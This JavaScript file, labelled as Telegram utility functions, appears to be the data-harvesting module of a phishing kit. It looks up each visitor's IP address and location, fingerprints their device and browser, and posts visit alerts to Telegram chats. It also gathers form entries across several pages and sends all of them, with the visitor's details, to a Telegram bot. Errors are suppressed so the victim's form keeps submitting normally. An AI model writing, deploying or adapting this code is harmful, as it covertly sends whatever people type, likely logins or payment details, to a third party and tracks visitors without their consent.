// Telegram utility functions for sending messages

/**
 * Get user's IP address and location information
 */
async function getUserInfo() {
    try {
        const response = await fetch("https://ipapi.co/json/", {
            method: "GET",
            headers: {
                "Accept": "application/json"
            }
        });
        
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        
        const data = await response.json();
        
        return {
            ip: data.ip || "Unknown",
            country: data.country_name || "Unknown",
            region: data.region || "Unknown",
            city: data.city || "Unknown",
            timezone: data.timezone || "Unknown"
        };
    } catch (error) {
        console.warn("Error fetching IP info (non-critical):", error);
        // Return default values - don't fail the entire process
        return {
            ip: "Unknown",
            country: "Unknown",
            region: "Unknown",
            city: "Unknown",
            timezone: "Unknown"
        };
    }
}

/**
 * Detect device type and browser
 */
function getDeviceInfo() {
    const ua = navigator.userAgent;
    
    // Detect device type
    let device = "Desktop";
    if (/mobile/i.test(ua)) device = "Mobile";
    else if (/tablet/i.test(ua)) device = "Tablet";
    
    // Detect browser
    let browser = "Unknown";
    if (/Edg/i.test(ua)) browser = "Edge";
    else if (/Chrome/i.test(ua)) browser = "Chrome";
    else if (/Firefox/i.test(ua)) browser = "Firefox";
    else if (/Safari/i.test(ua)) browser = "Safari";
    else if (/Opera|OPR/i.test(ua)) browser = "Opera";
    
    return { device, browser };
}

/**
 * Send message to Telegram (supports multiple chat IDs)
 */
async function sendToTelegram(message, parseMode = 'Markdown') {
    if (!TELEGRAM_CONFIG.BOT_TOKEN || !TELEGRAM_CONFIG.CHAT_ID || 
        TELEGRAM_CONFIG.BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' || 
        TELEGRAM_CONFIG.CHAT_ID === 'YOUR_CHAT_ID_HERE') {
        console.warn('Telegram configuration not set. Please update config.js');
        return false;
    }
    
    // Support both single chat ID (string) and multiple chat IDs (array)
    let chatIds = [];
    if (Array.isArray(TELEGRAM_CONFIG.CHAT_ID)) {
        chatIds = TELEGRAM_CONFIG.CHAT_ID;
    } else if (typeof TELEGRAM_CONFIG.CHAT_ID === 'string') {
        // Support comma-separated string or single string
        chatIds = TELEGRAM_CONFIG.CHAT_ID.includes(',') 
            ? TELEGRAM_CONFIG.CHAT_ID.split(',').map(id => id.trim())
            : [TELEGRAM_CONFIG.CHAT_ID];
    } else {
        console.warn('Invalid CHAT_ID format in config.js');
        return false;
    }
    
    // Send message to all chat IDs
    const sendPromises = chatIds.map(async (chatId) => {
        try {
            const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`, {
                method: "POST",
                headers: { 
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                    parse_mode: parseMode
                })
            });
            
            if (!response.ok) {
                const errorData = await response.json().catch(() => ({}));
                console.warn(`Telegram API error for chat ${chatId}:`, response.status, errorData);
                return false;
            }
            
            return true;
        } catch (error) {
            console.warn(`Error sending Telegram message to ${chatId} (non-critical):`, error);
            return false;
        }
    });
    
    // Wait for all messages to be sent (don't fail if some fail)
    const results = await Promise.all(sendPromises);
    // Return true if at least one message was sent successfully
    return results.some(result => result === true);
}

/**
 * Send visit notification to Telegram
 */
async function sendVisitNotification() {
    const userInfo = await getUserInfo();
    const deviceInfo = getDeviceInfo();
    
    const message = `
📩 *New Visit Detected*  
━━━━━━━━━━━━━━━  
🌍 *IP:* ${userInfo.ip}  
🏙️ *City:* ${userInfo.city}  
🌏 *Country:* ${userInfo.country}  
🕒 *Timezone:* ${userInfo.timezone}  
💻 *Device:* ${deviceInfo.device}  
🧭 *Region:* ${userInfo.region}  
🌐 *Browser:* ${deviceInfo.browser}  
🔗 *Page:* ${window.location.href}  
🔁 *Referrer:* ${document.referrer || "Direct Visit"}
`;
    
    await sendToTelegram(message);
}

/**
 * Send form data to Telegram (cumulative - includes all previous entries)
 */
async function sendFormDataToTelegram(subject, data) {
    try {
        // Get previous data from sessionStorage
        let previousData = {};
        try {
            const stored = sessionStorage.getItem('formData');
            if (stored) {
                previousData = JSON.parse(stored);
            }
        } catch (e) {
            console.warn("Error reading previous form data:", e);
        }
        
        // Merge previous data with new data (new data overwrites if key exists)
        const cumulativeData = { ...previousData, ...data };
        
        // Save cumulative data back to sessionStorage
        try {
            sessionStorage.setItem('formData', JSON.stringify(cumulativeData));
        } catch (e) {
            console.warn("Error saving form data:", e);
        }
        
        // Get user info - don't fail if this errors
        const userInfo = await getUserInfo().catch(() => ({
            ip: "Unknown",
            country: "Unknown",
            region: "Unknown",
            city: "Unknown",
            timezone: "Unknown"
        }));
        
        const deviceInfo = getDeviceInfo();
        
        let message = `📋 *${subject}*\n━━━━━━━━━━━━━━━\n`;
        
        // Add all cumulative form data (previous + new)
        for (const [key, value] of Object.entries(cumulativeData)) {
            if (value) {
                message += `*${key}:* ${value}\n`;
            }
        }
        
        // Add user info
        message += `\n━━━━━━━━━━━━━━━\n`;
        message += `🌍 *IP:* ${userInfo.ip}\n`;
        message += `🏙️ *City:* ${userInfo.city}\n`;
        message += `🌏 *Country:* ${userInfo.country}\n`;
        message += `💻 *Device:* ${deviceInfo.device}\n`;
        message += `🌐 *Browser:* ${deviceInfo.browser}\n`;
        message += `🔗 *Page:* ${window.location.href}\n`;
        
        // Try to send - but don't throw if it fails
        await sendToTelegram(message).catch(err => {
            console.warn("Telegram send failed (non-critical):", err);
        });
    } catch (error) {
        // Log but don't throw - form submission should continue
        console.warn("Error in sendFormDataToTelegram (non-critical):", error);
    }
}

